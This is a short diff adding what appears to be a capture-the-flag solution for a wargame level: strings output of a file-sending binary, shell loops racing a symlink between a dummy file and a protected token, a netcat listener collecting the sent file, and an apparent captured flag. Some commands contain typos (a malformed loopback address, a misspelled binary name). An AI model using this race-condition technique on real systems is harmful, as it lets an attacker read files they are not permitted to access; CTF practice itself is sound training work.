@@ -1,0 +1,20 @@
+strings ./level10
+    ->      %s   file host
+            sends file to host if you have access to it
+            Connecting to %s:6969 .. 
+            Unable to connect to host %s
+            .*( )*.
+            Unable to write banner to host %s
+            Connected!
+            Sending file .. 
+            Damn. Unable to open file
+            Unable to read from file: %s
+            wrote file!
+            You don't have access to %s
+
+echo "-----" > /var/crash/phony
+while true; do ln -sf /var/crash/phony/ /var/crash/link;  ln -sf /home/user/level10/token /var/crash/link; done
+while true; do nc -l 121.0.0.1 6969 >> /var/crash/solution; done
+while true; do /home/user/level10/lvel10 /var/crash/link 121.0.0.1; done
+
+    woupa2yuojeeaaed06riuj63c
